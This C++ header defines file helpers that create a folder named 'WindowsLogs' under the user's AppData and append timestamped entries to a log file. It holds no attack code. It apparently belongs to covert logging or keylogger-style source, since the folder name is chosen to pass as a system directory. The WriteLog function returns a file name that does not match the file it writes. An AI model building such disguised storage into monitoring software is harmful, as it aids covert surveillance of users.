#ifndef IO_H
#define IO_H

#include <string>
#include <fstream>
#include <windows.h>
#include "helper.h"

namespace IO {

    std::string GetOurPath(bool append_separator = false) {
        const char* appdata = std::getenv("APPDATA");
        if (!appdata) throw std::runtime_error("APPDATA environment variable not found.");

        std::string path = std::string(appdata) + "\\WindowsLogs";
        return append_separator ? path + "\\" : path;
    }

    bool MKDir(const std::string& path) {
        return CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
    }

    template <class T>
    std::string WriteLog(const T& t, const std::string& file_path = "applog.txt") {
        helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";

        try {
            std::ofstream file(file_path, std::ios::app);
            if (!file) return "";

            file << "[" << dt.GetDateTimeString() << "]\n" << t << std::endl;
            return name;
        } catch (...) {
            return "";
        }
    }
}

#endif  // IO_H

